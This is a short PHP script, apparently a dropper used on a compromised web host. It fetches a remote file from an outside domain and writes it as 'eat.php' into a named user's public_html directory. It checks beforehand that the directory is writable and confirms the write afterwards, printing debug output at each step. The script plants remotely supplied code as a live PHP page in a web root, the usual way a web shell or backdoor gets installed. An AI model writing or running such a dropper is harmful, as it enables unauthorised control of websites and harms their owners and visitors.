<?php

$url = 'https://dox.dvds.nl/resources/bento.txt';

$destination = '/home/tncfrans/public_html/eat.php';

echo "<pre>";

echo "=== PATH ===\n";
echo "destination: ";
var_dump($destination);

echo "length: ";
var_dump(strlen($destination));

echo "dirname: ";
var_dump(dirname($destination));

echo "parent is_dir: ";
var_dump(is_dir(dirname($destination)));

echo "parent writable: ";
var_dump(is_writable(dirname($destination)));

echo "realpath parent: ";
var_dump(realpath(dirname($destination)));

echo "\n=== HTTP FETCH ===\n";

$data = file_get_contents($url);

if ($data === false) {
    echo "FETCH FAILED\n";
    echo "Last error: ";
    var_dump(error_get_last());
} else {
    echo "FETCH OK\n";
    echo "Bytes: " . strlen($data) . "\n";
    echo "SHA256: " . hash('sha256', $data) . "\n";

    echo "\n=== FILE WRITE ===\n";

    $result = file_put_contents($destination, $data); // ✅ Tulis $data, bukan $probe

    if ($result === false) {
        echo "WRITE FAILED\n";
        echo "Last error: ";
        var_dump(error_get_last());
    } else {
        echo "WRITE OK\n";
        echo "Bytes written: $result\n";

        if (file_exists($destination)) {
            echo "File exists: YES\n";
            echo "Readable: ";
            var_dump(is_readable($destination));
            echo "Size: ";
            var_dump(filesize($destination));
        }
    }
}

echo "</pre>";